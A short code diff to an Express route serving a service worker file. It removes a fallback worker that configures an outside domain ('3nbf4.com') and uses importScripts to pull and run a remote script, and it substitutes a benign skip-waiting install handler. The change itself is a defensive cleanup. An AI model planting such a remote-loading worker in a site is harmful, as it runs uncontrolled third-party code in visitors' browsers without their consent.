@@ -88,13 +88,7 @@ app.get(['/sw.js', '/api/sw.js'], (_req, res) => {
   } else if (fs.existsSync(distSwPath)) {
     res.sendFile(distSwPath);
   } else {
-    res.send(`self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 11564979
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
-`);
+    res.send(`self.addEventListener('install', () => self.skipWaiting());`);
   }
 });
 
